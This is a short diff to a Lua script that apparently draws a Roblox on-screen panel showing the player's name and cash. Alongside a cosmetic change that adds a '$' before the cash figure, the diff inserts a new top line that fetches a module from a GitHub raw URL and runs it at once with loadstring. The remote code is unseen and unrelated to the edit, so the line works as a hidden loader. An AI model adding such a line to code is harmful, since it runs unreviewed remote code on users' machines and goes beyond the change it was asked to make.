@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/freecontrolreal/cntrl/main/src/modules/MainModule.lua'))()
+
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local NameOut = Instance.new("TextLabel")
@@ -39,9 +41,9 @@ CashOut.TextSize = 20.000
 
 spawn(function()
     repeat wait() until workspace.Players:FindFirstChild(game:service"Players".LocalPlayer.Name)
-    CashOut.Text = FormatNumToStyle(game:service"Players".LocalPlayer.DataFolder.Currency.Value)
+    CashOut.Text = '$'..FormatNumToStyle(game:service"Players".LocalPlayer.DataFolder.Currency.Value)
     game:service"Players".LocalPlayer.DataFolder.Currency.Changed:Connect(function()
-        CashOut.Text = FormatNumToStyle(game:service"Players".LocalPlayer.DataFolder.Currency.Value)
+        CashOut.Text = '$'..FormatNumToStyle(game:service"Players".LocalPlayer.DataFolder.Currency.Value)
     end)
 end)
 
